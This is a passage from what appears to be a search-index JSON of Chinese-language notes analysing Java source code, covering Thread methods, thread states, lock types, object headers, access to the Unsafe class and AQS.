(isAlive()) {\n            long delay = millis - now;\n            if (delay &lt;= 0) {//\u8d85\u65f6\u4fbf\u7ed3\u675f\uff0c\n                break;\n            }\n            wait(delay);\n            now = System.currentTimeMillis() - base;\n        }\n    }\n}\n</code></pre> <ul> <li>JDK19\u4e4b\u540e\u7684<code>join()</code>\u51fd\u6570\u4e0d\u4f7f\u7528\u540c\u6b65\u9501\uff0c\u589e\u52a0\u4e86\u5bf9\u865a\u62df\u7ebf\u7a0b\u7684\u5904\u7406\uff08\u865a\u62df\u7ebf\u7a0b\u4e0d\u52a0\u9501\uff09,\u540c\u65f6\u64cd\u4f5c\u7684\u9897\u7c92\u5ea6\u66f4\u7ec6\uff0c\u6027\u80fd\u6709\u6240\u63d0\u5347\u3002</li> </ul> <pre><code>public final void join(long millis) throws InterruptedException {\n    if (millis &lt; 0)\n        throw new IllegalArgumentException(\"timeout value is negative\");\n    if (this instanceof VirtualThread vthread) {//\u865a\u62df\u7ebf\u7a0b\u7684\u5904\u7406\u65b9\u5f0f\n        if (isAlive()) {\n            long nanos = MILLISECONDS.toNanos(millis);\n            vthread.joinNanos(nanos);\n        }\n        return;\n    }\n    synchronized (this) {\n        if (millis &gt; 0) {//\u9700\u8981\u53ca\u65f6\u65f6\u624d\u5f00\u59cb\u8ba1\u65f6\uff0c\u76f8\u6bd4JDK8\u6027\u80fd\u63d0\u5347\n            if (isAlive()) {\n                final long startTime = System.nanoTime();\n                long delay = millis;\n                do {//\u5e76\u975e\u771f\u6b63\u7684\u81ea\u65cb\n                    wait(delay);\n                } while (isAlive() &amp;&amp; (delay = millis -\n                         NANOSECONDS.toMillis(System.nanoTime() - startTime)) &gt; 0);\n            }\n        } else {\n            while (isAlive()) {//\u76f4\u5230\u4efb\u52a1\u5b8c\u6210\u4e3a\u6b62\n                wait(0);\n            }\n        }\n    }\n}\n</code></pre> </li> <li> <p><code>void setDaemon(boolean on)</code>\u8bbe\u7f6e\u7ebf\u7a0b\u662f\u5426\u4e3a\u5b88\u62a4\u7ebf\u7a0b\u3002\u6709\u4ee5\u4e0b\u51e0\u70b9\u6ce8\u610f</p> <ul> <li>\u865a\u62df\u7ebf\u7a0b\u4e0d\u80fd\u8fdb\u884c\u8bbe\u7f6e\uff08\u8bbe\u7f6e\u4e3afalse\u65f6\u4f1a\u62a5\u9519\uff09</li> <li>\u6b63\u5728\u8fd0\u884c\u7684\u7ebf\u7a0b\u4e0d\u80fd\u8bbe\u7f6e\uff08\u5426\u5219\u629b\u51fa\u5f02\u5e38\uff09</li> </ul> <pre><code>public final void setDaemon(boolean on) {\n    checkAccess();\n    if (isVirtual() &amp;&amp; !on)\n        throw new IllegalArgumentException(\"'false' not legal for virtual threads\");\n    if (isAlive())\n        throw new IllegalThreadStateException();\n    if (!isVirtual())\n        daemon(on);\n}\n</code></pre> </li> <li> <p><code>isAlive()</code>\u5224\u65ad\u7ebf\u7a0b\u662f\u5426\u5b58\u6d3b\u3002\u901a\u8fc7<code>eetop</code>\u5b57\u6bb5\u5224\u65ad</p> <p><code>eetop</code>\u4fdd\u7559\u4f9bJVM\u72ec\u5360\u4f7f\u7528\u3002\u65e0\u6cd5\u79fb\u52a8\u5230FieldHolder\u56e0\u4e3a\u5728\u6267\u884c\u4e4b\u524d\uff0c\u5b83\u9700\u8981\u7531VM\u4e3aJNI\u9644\u52a0\u7ebf\u7a0b\u8bbe\u7f6e\u5c06\u521b\u5efaFieldHolder\u7684\u6784\u9020\u51fd\u6570\u3002\u5386\u53f2\u4e0a\u547d\u540d\u7684<code>eetop</code>\u4fdd\u5b58\u5e95\u5c42VM JavaThread\u7684\u5730\u5740\uff0c\u5e76\u8bbe\u7f6e\u4e3a\u7ebf\u7a0b\u542f\u52a8\u65f6\u4e3a\u975e\u96f6\uff0c\u7ebf\u7a0b\u7ec8\u6b62\u65f6\u91cd\u7f6e\u4e3a\u96f6\u3002\u975e\u96f6\u503c\u8868\u793a\u6b64\u7ebf\u7a0b\u4e3aAlive\uff08\uff09\u3002</p> </li> <li> <p>\u7ebf\u7a0b\u7684\u72b6\u6001</p> <ul> <li>NEW A thread that has not yet started is in this state.</li> <li>RUNNABLE A thread executing in the Java virtual machine is in this state.</li> <li>BLOCKED A thread that is blocked waiting for a monitor lock is in this state.</li> <li>WAITING A thread that is waiting indefinitely for another thread to perform a particular action is in this state.</li> <li>TIMED_WAITING A thread that is waiting for another thread to perform an action for up to a specified waiting time is in this state.</li> <li>TERMINATED A thread that has exited is in this state.</li> </ul> </li> <li> <p>\u6bcf\u4e2a\u7ebf\u7a0b\u53ef\u4ee5\u62e5\u6709\u4e00\u4e2a\u5355\u72ec\u7684\u5f02\u5e38\u5904\u7406\u5668\uff0c\u53ef\u4ee5\u901a\u8fc7<code>setUncaughtExceptionHandler()</code>\u4e3a\u7ebf\u7a0b\u8bbe\u7f6e\u5f02\u5e38\u5904\u7406\u5668\uff0c\u5f02\u5e38\u5904\u7406\u5668\u4e3b\u8981\u662f\u5904\u7406\u672a\u6355\u83b7\u7684\u5f02\u5e38\uff0c\u5982\u679c\u6ca1\u6709\u8bbe\u7f6e\uff0c\u5c06\u4f7f\u7528\u7ebf\u7a0b\u7ec4\u7c7b\u3002\uff08\u7ebf\u7a0b\u7ec4\u5b9e\u73b0\u4e86\u7ebf\u7a0b\u7684\u5f02\u5e38\u5904\u7406\u5668\u3002\uff09</p> <pre><code>public UncaughtExceptionHandler getUncaughtExceptionHandler() {\n    if (isTerminated()) {\n        // uncaughtExceptionHandler may be set to null after thread terminates\n        return null;\n    } else {\n        UncaughtExceptionHandler ueh = uncaughtExceptionHandler;\n        return (ueh != null) ? ueh : getThreadGroup();\n    }\n}\n\npublic void setUncaughtExceptionHandler(UncaughtExceptionHandler ueh) {\n    checkAccess();\n    uncaughtExceptionHandler(ueh);\n}\n</code></pre> </li> <li> <p>\u731c\u60f3\uff1a\u7ebf\u7a0b\u4e5f\u662f\u4e00\u4e2a\u9501\u5bf9\u8c61\uff0c\u5982\u679c\u7ebf\u7a0b\u5bf9\u8c61\u88ab\u5176\u4ed6\u5bf9\u8c61\u52a0\u4e0a\u4e86\u9501\uff0c\u7ebf\u7a0b\u662f\u4e0d\u662f\u5c31\u4e0d\u80fd\u8fd0\u884c\u4e86\uff1f</p> <pre><code>public final static Thread thread;\nstatic {\n    thread = new Thread(() -&gt; {\n        for (int i = 0; i &lt; 1000; ++i){\n            System.out.println(Thread.currentThread().getName() + \": \" + i);\n            System.out.println(Thread.holdsLock(MD5Test.thread));\n            try {\n                Thread.sleep(10);\n            } catch (InterruptedException e) {\n                throw new RuntimeException(e);\n            }\n        }\n    });\n}\npublic static void main(String[] args) {\n    thread.start();\n    synchronized (MD5Test.thread){\n        System.out.println(Thread.currentThread().getName());\n        try {\n             Thread.sleep(1000);\n        } catch (InterruptedException e) {\n             throw new RuntimeException(e);\n        }\n}\n</code></pre> <p>\u8f93\u51fa\u7ed3\u679c\u662ffalse\uff0c\u4f46\u662f\u80fd\u8fd0\u884c\u3002\u56e0\u6b64\u8bc1\u660e\u7ebf\u7a0b\u5bf9\u8c61\u7684\u9501\u4e0d\u4f1a\u5bfc\u81f4\u7ebf\u7a0b\u65e0\u6cd5\u6b63\u5e38\u8fd0\u884c\u3002</p> </li> </ul>"},{"location":"Note/Java%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#_18","title":"\u603b\u7ed3","text":"<ul> <li>JDK19\u63d0\u51fa\u7684\u865a\u62df\u7ebf\u7a0b\u4e0eGoLang\u4e2d\u7684\u534f\u7a0b\u76f8\u4f3c\uff0c\u4f46\u662f\u4e8c\u8005\u5728\u5b9e\u73b0\u4e0a\u9762\u5dee\u522b\u5f88\u5927\u3002Java19 \u865a\u62df\u7ebf\u7a0b VS Go \u534f\u7a0b \u7684\u541e\u5410\u91cf-CSDN\u535a\u5ba2</li> <li>JDK19\u63d0\u51fa\u7684\u865a\u62df\u7ebf\u7a0b\u662f\u9884\u89c8\u7248\uff0cJDK21\u6b63\u5f0f\u53d1\u5e03\uff0cJava\u4e2d\u7684\u534f\u7a0b \u6210\u4e3a\u672a\u6765\u957f\u671f\u652f\u6301\u7ef4\u62a4\u7684\u4e00\u79cd\u7279\u6027</li> <li>\u4e00\u4e2a\u7ebf\u7a0b\u53ea\u80fd\u542f\u52a8\u4e00\u6b21\uff0c\u542f\u52a8\u4e4b\u540e\u7ebf\u7a0b\u7684\u72b6\u6001\u6539\u53d8\u3002</li> <li>\u7ebf\u7a0b\u4e0d\u5904\u4e8eNEW\u548cTERMINAL\u624d\u88ab\u8ba4\u4e3a\u662f\u5b58\u6d3b\u7684\uff08Alive\uff09\uff0c\u5b83\u4f7f\u7528eetop\u662f\u5426\u4e3a0\u6765\u5224\u65ad\u3002eetop\u4f3c\u4e4e\u548c\u7ebf\u7a0b\u6808\u7a7a\u95f4\u7684\u5927\u5c0f\u6709\u5173\u3002</li> <li>\u865a\u62df\u7ebf\u7a0b\u4e0d\u80fd\u8bbe\u7f6e\u4e3a\u5b88\u62a4\u7ebf\u7a0b\uff0c\u5982\u679c\u5c06\u865a\u62df\u7ebf\u7a0b\u8bbe\u7f6e\u4e3a\u975e\u5b88\u62a4\u7ebf\u7a0b\u4f1a\u62a5\u9519</li> <li>\u865a\u62df\u7ebf\u7a0b\u4e0d\u80fd\u8bbe\u7f6e\u4f18\u5148\u7ea7\uff0c\u4f18\u5148\u7ea7\u90fd\u4e3a5</li> <li>\u5bf9\u6b63\u5728\u8fd0\u884c\u7684\u5e73\u53f0\u7ebf\u7a0b\u6539\u52a8\u540d\u79f0\u4f1a\u8c03\u7528\u5e95\u5c42\u63a5\u53e3\uff0c\u4f7f\u5176\u5728\u5bc4\u5b58\u5668\u6216\u8005\u672c\u5730\u5185\u5b58\u4e2d\u7684\u540d\u79f0\u6539\u53d8\u3002</li> <li>JDK8\u548cJDK9\u4e4b\u540e\u7684<code>Thread.start()</code>\u65b9\u6cd5\u7684\u533a\u522b\u7f6e\u7591\u5c31\u662f\u5c06\u540c\u6b65\u65b9\u6cd5\u6539\u6210\u4e86\u540c\u6b65\u4ee3\u7801\u5757\u3002\u8fd9\u6837\u6539\u7684\u597d\u5904\u76ee\u524d\u4e3a\u6b62</li> </ul>"},{"location":"Note/Java%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#1","title":"\u8865\u51451. \u5bf9\u8c61\u5728\u5185\u5b58\u4e2d\u7684\u5b58\u50a8\u5f62\u5f0f","text":"<p>\u7531\u4e8e\u540e\u9762\u53ef\u80fd\u9700\u8981\u6d89\u53ca\u5230\u9501\u7684\u6982\u5ff5\uff0c\u56e0\u6b64\u518d\u6b21\u5c06\u5bf9\u8c61\u7684\u5185\u5b58\u5f62\u5f0f\u4ecb\u7ecd\u4e00\u4e0b\u3002</p>"},{"location":"Note/Java%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#_19","title":"\u5bf9\u8c61\u7684\u5185\u5b58\u7ed3\u6784\u56fe","text":""},{"location":"Note/Java%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#_20","title":"\u5bf9\u8c61\u5934","text":"<p>\u5bf9\u8c61\u5934\u6709\u4e09\u90e8\u5206\u6784\u6210\uff1aMark Word\u3001\u6307\u5411\u7c7b\u7684\u6307\u9488\u3001\u6570\u7ec4\u957f\u5ea6\uff08\u4ec5\u6570\u7ec4\u6709\uff09</p> <ul> <li>Mark Word\uff1a\u8bb0\u5f55\u5bf9\u8c61\u548c\u9501\u7684\u4fe1\u606f\uff0c\u7b49\u4e8e\u673a\u5668\u5b57\u957f</li> </ul> <p>\u4e0d\u540c\u65f6\u671f\u7684Mark Word \u6709\u4e0d\u540c\u7684\u7ed3\u6784</p> <p></p> <ul> <li>\u6307\u5411\u7c7b\u7684\u6307\u9488\uff1a\u8868\u660e\u7c7b\u578b\uff0c32\u4f4d\u673a\u5668\u4e0a\u5fc5\u5b9a\u662f32bit\uff0c64\u4f4d\u673a\u5668\u4e0a\u4e3a64bit</li> </ul> <p>\u572864\u4f4d\u673a\u5668\u4e0a\uff0c\u6307\u9488\u4e00\u822c\u4e3a64bit\uff0c\u4f46\u662f\u6307\u9488\u538b\u7f29\u540e\u53ea\u670932bit\u3002</p> <p>\u6307\u9488\u538b\u7f29\u7684\u539f\u7406\uff1a\u7531\u4e8e\u5b57\u8282\u5bf9\u5176\u7684\u7f18\u6545\uff0c\u6bcf\u4e00\u4e2a\u5bf9\u8c61\u5fc5\u5b9a\u4e3a8\u5b57\u8282\u7684\u6574\u6570\u500d\uff0c\u56e0\u6b64\u538b\u7f29\u6307\u9488\u53ef\u4ee5\u4f7f\u7528\u7684\u8303\u56f4\u662f2^32*8=34359738368Byte\u3002\u4e5f\u5c31\u662f32G</p> <p>\u5f53\u5185\u5b58\u8d85\u8fc732G\u662f\u6307\u9488\u538b\u7f29\u5931\u6548</p> <ul> <li>\u6570\u7ec4\u957f\u5ea6\uff08\u4ec5\u6570\u7ec4\u6709\uff09\uff1a\u6570\u7ec4\u957f\u5ea6\uff0c\u6570\u7ec4\u5bf9\u8c61\u7684\u76f8\u5f53\u4e8e\u6570\u7ec4\u7684length\u5b57\u6bb5\u30024\u5b57\u8282\uff08\u56e0\u4e3a\u6570\u7ec4\u957f\u5ea6\u4e0a\u9650\u662fint\u7684\u6700\u5927\u503c\uff09</li> </ul>"},{"location":"Note/Java%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#2","title":"\u8865\u51452. \u9501\u7684\u5206\u7c7b","text":"<p>\u901a\u4fd7\u6613\u61c2 \u60b2\u89c2\u9501\u3001\u4e50\u89c2\u9501\u3001\u53ef\u91cd\u5165\u9501\u3001\u81ea\u65cb\u9501\u3001\u504f\u5411\u9501\u3001\u8f7b\u91cf/\u91cd\u91cf\u7ea7\u9501\u3001\u8bfb\u5199\u9501\u3001\u5404\u79cd\u9501\u53ca\u5176Java\u5b9e\u73b0\uff01 - \u77e5\u4e4e (zhihu.com)</p> <ul> <li>synchronized\u9501\u7684\u81ea\u52a8\u53d8\u6362</li> </ul> <p></p> <p>\u4e00\u65e6\u51fa\u73b0\u4e86\u4e24\u4e2a\u6216\u591a\u4e2a\u7ebf\u7a0b\u62a2\u5360\u5bf9\u8c61\u64cd\u4f5c\u65f6\uff0c\u504f\u5411\u9501\u5c31\u4f1a\u5347\u7ea7\u4e3a\u8f7b\u91cf\u7ea7\u9501\u3002</p> <p>\u5f53\u5bf9\u8c61\u7684\u9501\u5347\u7ea7\u4e3a\u8f7b\u91cf\u7ea7\u9501\u540e\uff0cJVM\u5c06\u5728\u8bf7\u6c42\u8be5\u5bf9\u8c61\u7684\u9501\u7684\u6240\u5168\u90e8\u7ebf\u7a0b\u7684\u6808\u7a7a\u95f4\u4e2d\u6dfb\u52a0\u4e00\u4e2a\u9501\u8bb0\u5f55\u7a7a\u95f4\uff0c\u7136\u540e\u5c06\u5bf9\u8c61\u5934\u4e2dMatkWord\u7684\u9501\u8bb0\u5f55\u6307\u9488\u6307\u5411\u83b7\u53d6\u5230\u9501\u7684\u7ebf\u7a0b\u7684\u9501\u8bb0\u5f55\u7a7a\u95f4\u3002\u5176\u4ed6\u7ebf\u7a0b\u60f3\u8981\u83b7\u53d6\u9501\u6307\u6b63\u901a\u8fc7CAS\u5c1d\u8bd5\u4fee\u6539\u5bf9\u8c61\u5934\u4e2d\u7684\u9501\u6307\u9488\u3002</p> <p>\u5982\u679c\u591a\u6b21\u66ff\u6362\u5931\u8d25\uff0c\u8f7b\u91cf\u9501\u5c31\u4f1a\u5347\u7ea7\u4e3a\u91cd\u91cf\u9501\uff0c\u5e76\u4e14\u4f7f\u7528\u64cd\u4f5c\u4e60\u9898\u5c42\u9762\u7684Mutes Lock(\u4e92\u65a5\u9501)\u6280\u672f\u5b9e\u73b0\u3002\u6027\u80fd\u635f\u8017\u5927</p> <p></p> <ul> <li> <p>\u60b2\u89c2\u9501\u3001\u4e50\u89c2\u9501\u3001\u81ea\u65cb\u9501\uff08\u8fd9\u4e09\u79cd\u90fd\u6307\u7684\u662f\u6240\u5f97\u7c7b\u578b\uff0c\u800c\u4e0d\u662f\u5177\u4f53\u7684\u9501\uff09</p> </li> <li> <p>\u60b2\u89c2\u9501\uff1a\u63d0\u524d\u4e0a\u9501\uff0c\u9632\u6b62\u522b\u4eba\u4fee\u6539</p> </li> <li> <p>-\u4e50\u89c2\u9501\uff08CAS\uff09\uff1a\u4e0d\u4e0a\u9501\uff0c\u8ba4\u4e3a\u4ed6\u4eba\u4e0d\u4f1a\u4fee\u6539\uff0c\u4f46\u662f\u5982\u679c\u68c0\u6d4b\u5230\u4fee\u6539\u53d1\u751f\uff0c\u5219\u91cd\u8bd5</p> </li> <li> <p>\u81ea\u65cb\u9501\uff1a\u901a\u8fc7<code>while(true)</code>\u7684\u65b9\u5f0f\u83b7\u53d6\u9501\u5bf9\u8c61\uff0c\u5e38\u5e38\u8ba4\u4e3a\u81ea\u65cb\u9501\u5c31\u662f\u4e50\u89c2\u9501\u3002</p> </li> <li> <p>\u53ef\u91cd\u5165\u9501</p> </li> <li> <p>\u89c1\u540d\u601d\u610f\u5c31\u662f\u53ef\u4ee5\u91cd\u590d\u8fdb\u5165\u7684\u9501\uff08\u5f53\u7136\u524d\u63d0\u662f\u540c\u4e00\u4e2a\u7ebf\u7a0b\uff09</p> </li> <li> <p>synchronized\u548cReentrant\u5f00\u5934\u547d\u540d\u7684\u9501\u90fd\u662f\u53ef\u91cd\u5165\u9501\u3002\u5e38\u89c1\u7684\u4f8b\u5b50\u6bd4\u5982synchronized\u5185\u90e8\u5728\u6765\u4e00\u4e2a\u5bf9\u540c\u4e00\u4e2a\u5bf9\u8c61\u7684synchronized\u540c\u6b65\u4ee3\u7801\u5757</p> </li> <li> <p>\u516c\u5e73\u9501\u3001\u975e\u516c\u5e73\u9501</p> </li> <li> <p>Java\u5185\u90e8\u6709\u5177\u4f53\u7684\u5b9e\u73b0\u7c7b\uff08FairSync\u3001NonfairSync\uff09</p> </li> <li>\u516c\u5e73\u9501\u5c31\u662f\u5148\u5230\u5148\u5f97\u539f\u5219\u3001\u975e\u516c\u5e73\u9501\u5c31\u662f\u968f\u673a\u6216\u8005\u6309\u7167\u4f18\u5148\u7ea7\u5206\u914d\u9501</li> <li> <p>\u4e8c\u8005\u90fd\u662f\u53ef\u91cd\u5165\u9501\uff0cReetrantLock\u7684\u9ed8\u8ba4\u7684\u6784\u9020\u8fd4\u56de\u7684\u5c31\u662f\u975e\u516c\u5e73\u9501</p> </li> <li> <p>\u53ef\u4e2d\u65ad\u9501</p> </li> <li> <p>\u53ef\u4ee5\u54cd\u5e94\u5916\u90e8\u7684\u6216\u8005\u5185\u90e8\u7684\u4e2d\u65ad\u7684\u6307\u4ee4\uff0c\u4e2d\u65ad\u8c03\u7528\u7ebf\u7a0b\u7684<code>interrupt()</code>\uff0c\u4f46\u662f\u5982\u4f55\u5904\u7406\u662f\u7531\u7ebf\u7a0b\u51b3\u5b9a\u7684\uff0c\u4e5f\u5c31\u662f\u4f60\u53d1\u51fa\u4e00\u4e2a\u4fe1\u53f7\uff0c\u4f46\u662f\u5bf9\u4e8e\u4fe1\u53f7\u7684\u5904\u7406\u6709\u5185\u90e8\u5b9e\u73b0\u51b3\u5b9a\u3002\u4e5f\u5c31\u662f\u8bf4\u7ebf\u7a0b\u53ef\u80fd\u4e0d\u4f1a\u88ab\u4e2d\u65ad\u3002</p> </li> <li>\u5728Java\u4e2d\u65ad\u6a21\u578b\u4e2d\u7684\u4e2d\u65ad\u7684\u4f53\u73b0\u5c31\u662f\u5728\u7ebf\u7a0b\u7684\u672c\u5730\u5185\u5b58\u4e2d\u6709\u4e00\u4e2aboolean\u503c\u6765\u4fdd\u5b58\u4e2d\u65ad\u4fe1\u53f7\uff0c\u53ef\u4ee5\u901a\u8fc7<code>boolean isInterrupted()</code>\u67e5\u770b\u4e2d\u65ad\u4fe1\u606f\u5e76\u4e14\u6e05\u695a\u4e2d\u65ad\u4fe1\u606f\u3002</li> <li> <p>\u4e0d\u53ef\u4e2d\u65ad\u963b\u585e\uff1a</p> <ul> <li>java.io\u5305\u4e2d\u7684\u540c\u6b65Socket I/O</li> <li>java.io\u5305\u4e2d\u7684I/O</li> <li>Selector\u7684\u5f02\u6b65I/O</li> <li>sychronized\u540c\u6b65\u9501</li> </ul> </li> <li> <p>\u53ef\u4e2d\u65ad\u963b\u585e\uff1a</p> <ul> <li>Thread\u65b9\u6cd5\u4e2d\u7684<code>sleep()</code>\u3001<code>wait()</code>\u3001<code>join()</code></li> <li><code>LockSupport.park()</code>\u65b9\u6cd5</li> <li>Lock\u9501\uff08Lock\u63a5\u53e3\u5982\u4e0b\uff09</li> </ul> </li> </ul> <pre><code>/* Lock\u63a5\u53e3 */\npublic interface Lock {\n\n    void lock(); // \u62ff\u4e0d\u5230\u9501\u5c31\u4e00\u76f4\u7b49\uff0c\u62ff\u5230\u9a6c\u4e0a\u8fd4\u56de\u3002\n\n    void lockInterruptibly() throws InterruptedException; \n    // \u62ff\u4e0d\u5230\u9501\u5c31\u4e00\u76f4\u7b49\uff0c\u5982\u679c\u7b49\u5f85\u65f6\u6536\u5230\u4e2d\u65ad\u8bf7\u6c42\uff0c\u5219\u9700\u8981\u5904\u7406InterruptedException\u3002\n\n    boolean tryLock(); // \u65e0\u8bba\u62ff\u4e0d\u62ff\u5f97\u5230\u9501\uff0c\u90fd\u9a6c\u4e0a\u8fd4\u56de\u3002\u62ff\u5230\u8fd4\u56detrue\uff0c\u62ff\u4e0d\u5230\u8fd4\u56defalse\u3002\n\n    boolean tryLock(long time, TimeUnit unit) throws InterruptedException; \n    // \u540c\u4e0a\uff0c\u53ef\u4ee5\u81ea\u5b9a\u4e49\u7b49\u5f85\u7684\u65f6\u95f4\u3002\n\n    void unlock();\n\n    Condition newCondition();\n}\n</code></pre> <ul> <li> <p>\u8bfb\u5199\u9501\u3001\u5171\u4eab\u9501\u3001\u4e92\u65a5\u9501</p> </li> <li> <p>\u8bfb\u9501\u548c\u5199\u9501\u4e00\u822c\u6210\u5bf9\u51fa\u73b0\uff0c\u8bfb\u9501\uff08\u5171\u4eab\u9501\uff09\u3001\u5199\u9501\uff08\u4e92\u65a5\u9501\u3001\u6392\u4ed6\u9501\uff09\u53ef\u4ee5\u53c2\u7167MySQL\u7684\u9501\u673a\u5236</p> </li> <li>JDK\u4e2d\u5bf9\u4e8eReadWriteLock\u63a5\u53e3\u7684\u552f\u4e00\u5b9e\u73b0\u7c7b\u5c31\u662fReentrantReadWriteLock\u3002</li> </ul>"},{"location":"Note/Java%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#3-unsafe","title":"\u8865\u51453. Unsafe\u7c7b","text":"<p>Java\u9b54\u6cd5\u7c7b\uff1aUnsafe\u5e94\u7528\u89e3\u6790 - \u7f8e\u56e2\u6280\u672f\u56e2\u961f (meituan.com)</p> <p>Unsafe\u662f\u4f4d\u4e8esun.misc\u5305\u4e0b\u7684\u7c7b\uff0c\u4e3b\u8981\u7ed9JDK\u81ea\u5df1\u8fdb\u884c\u4e00\u4e9b\u5185\u5b58\u7ea7\u522b\u7684\u64cd\u4f5c\uff0c\u6bd4\u5982\u8bfb\u5199\u6307\u5b9a\u5185\u5b58\u5730\u5740\uff0c\u7533\u8bf7\u3001\u91ca\u653e\u5185\u5b58\u7b49\u3002</p> <p>\u7531\u4e8eUnsafe\u64cd\u4f5c\u5341\u5206\u5371\u9669\uff0c\u56e0\u6b64\u5b98\u65b9\u628a\u975eJDK\u5305\u4e0b\u7684\u7c7b\u7684\u4f7f\u7528Unsafe\u7684\u6743\u9650\u90fd\u7ed9ban\u6389\u4e86\uff08\u6784\u9020\u79c1\u6709\uff0c\u5355\u4f8b\uff0c\u5728<code>getUnsafe()</code>\u4e2d\u5bf9\u8c03\u7528\u8005\u68c0\u67e5\u6743\u9650\uff09</p> <p>\u5b98\u65b9\u4e5f\u8bf4\uff1a\u6c42\u6c42\u4f60\u4eec\u522b\u7528Unsafe\u7c7b\u4e86\uff0c\u6211\u77e5\u9053Java\u7684\u6027\u80fd\u4e0d\u662f\u5f88\u597d\uff0c\u4f46\u662f\u6211\u6539\u8fd8\u4e0d\u884c\u5417\uff1f</p> <p>\u6211\uff1a\u4f60\u8bf4\u5f97\u5bf9\uff0c\u4f46\u662f\u6211\u4e0d\u542c</p> <p>\u90a3\u6211\u4eec\u5982\u679c\u60f3\u4f7f\u7528Unsafe\u7c7b\u600e\u4e48\u529e\u5462\uff1f</p> <p>\u6211\u4eec\u9996\u5148\u89c2\u5bdf\u4e00\u4e0bUnsafe\u7c7b\u7684\u7ed3\u6784\uff1aUnsafe\u7c7b\u4e2d\u6709\u4e00\u4e2a\u5355\u4f8btheUnsafe\uff0c\u4f46\u662f\u4ed6\u4e0d\u80fd\u76f4\u63a5\u83b7\u53d6\uff08private\uff09\uff0c\u5728JDK\u7684\u5176\u4ed6\u7c7b\u90fd\u662f\u901a\u8fc7<code>getUnsafe()</code>\u83b7\u53d6\u7684\uff0c\u4f46\u662f\u8fd9\u4e2a\u91cc\u9762\u68c0\u67e5\u4e86\u6211\u4eec\u662f\u4e0d\u662fJDK\u5185\u90e8\u7c7b\uff0c\u6240\u4ee5\u6211\u4eec\u6709\u4e24\u79cd\u65b9\u6cd5\uff1a</p> <ul> <li>\u5c06\u7c7b\u7528BootStrapClassLoader\u52a0\u8f7d</li> </ul> <pre><code>java -Xbootclasspath/a: ${path}   # \u5176\u4e2dpath\u4e3a\u8c03\u7528Unsafe\u76f8\u5173\u65b9\u6cd5\u7684\u7c7b\u6240\u5728jar\u5305\u8def\u5f84\n</code></pre> <ul> <li>\u901a\u8fc7\u53cd\u5c04\u76f4\u63a5\u83b7\u53d6theUnsafe\u5bf9\u8c61</li> </ul> <pre><code>private static Unsafe reflectGetUnsafe() {\n    try {\n      Field field = Unsafe.class.getDeclaredField(\"theUnsafe\");\n      field.setAccessible(true);\n      return (Unsafe) field.get(null);\n    } catch (Exception e) {\n      log.error(e.getMessage(), e);\n      return null;\n    }\n}\n</code></pre> <p>\u83b7\u53d6\u5230\u4e4b\u540e\u6709\u5565\u7528\u5462\uff1f </p> <p></p> <p>\u5177\u4f53\u53ef\u53c2\u8003\u7f8e\u56e2\u7684\u90a3\u7bc7\u6587\u7ae0Java\u9b54\u6cd5\u7c7b\uff1aUnsafe\u5e94\u7528\u89e3\u6790 - \u7f8e\u56e2\u6280\u672f\u56e2\u961f (meituan.com)</p>"},{"location":"Note/Java%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#2-aqsabstractqueuedsynchronizer","title":"2. AQS(AbstractQueuedSynchronizer)","text":""},{"location":"Note/Java%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#_21","title":"\u6e90\u7801\u5206\u6790","text":"<ul> <li>\u9996\u5148\u6211\u4eec\u770b\u770bAQS\u7684\u5e94\u7528\uff08\u57fa\u672c\u4e0a\u4e3aJUC\u63d0\u4f9b\u4e86\u901a\u7528\u7684\u529f\u80fd\u5f3a\u5927\u7684\u6846\u67b6\uff09</li> </ul> <ul> <li>AQS\u5b50\u7c7b\u80fd\u8986\u5199\u7684\u51e0\u4e2a\u63a5\u53e3\uff08\u8fd9\u51e0\u4e2a\u63a5\u53e3\u5e76\u6ca1\u6709\u8bbe\u7f6e\u6210\u62bd\u8c61\u65b9\u6cd5\uff0cAQS\u6846\u67b6\u5e0c\u671b\u5b50\u7c7b\u80fd\u591f\u9009\u62e9\u6027\u7684\u5b9e\u73b0\u5176\u4e2d\u7684\u65b9\u6cd5\uff0c\u800c\u8fd9\u4e9b\u65b9\u6cd5\u5177\u4f53\u7684\u8c03\u7528\u90fd\u662f\u5728AQS\u7c7b\u7684\u6846\u67b6\u4e2d\u81ea\u52a8\u5b8c\u6210\uff09</li> </ul> <pre><code>// \u5c1d\u8bd5\u83b7\u53d6\u6392\u5b83\u9501\uff08exclusive lock\uff09\nprotected boolean tryAcquire(int arg) {\n    throw new UnsupportedOperationException();\n}\n\n// \u5c1d\u8bd5\u91ca\u653e\u6392\u5b83\u9501\nprotected boolean tryRelease(int arg) {\n    throw new UnsupportedOperationException();\n}\n\n// \u5c1d\u8bd5\u83b7\u53d6\u5171\u4eab\u9501\uff08shared lock\uff09\nprotected int tryAcquireShared(int arg) {\n    throw new UnsupportedOperationException();\n}\n\n// \u5c1d\u8bd5\u91ca\u653e\u5171\u4eab\u9501\nprotected boolean tryReleaseShared(int arg) {\n    throw new UnsupportedOperationException();\n}\n\n// \u662f\u5426\u6301\u6709\u6392\u5b83\u9501\uff08\u6301\u6709\u7684\u9501\u662f\u5426\u5177\u6709\u6392\u4ed6\u6027\uff09\nprotected boolean isHeldExclusively() {\n    throw new UnsupportedOperationException();\n}\n</code></pre> <p>\u4e0d\u540c\u7528\u9014\u7684\u5b50\u7c7b\u53ef\u4ee5\u9009\u62e9\u6027\u7684\u8986\u5199\u5176\u4e2d\u7684\u65b9\u6cd5\uff0c\u6bd4\u5982\u8bfb\u9501\u5206\u522b\u5b9e\u73b0\u6392\u5b83\u9501\u548c\u5171\u4eab\u9501\u7684\u90e8\u5206\u3002</p> <ul> <li>AQS\u6838\u5fc3\u539f\u7406\u52a8\u753b\u6f14\u793a</li> </ul> <ul> <li> 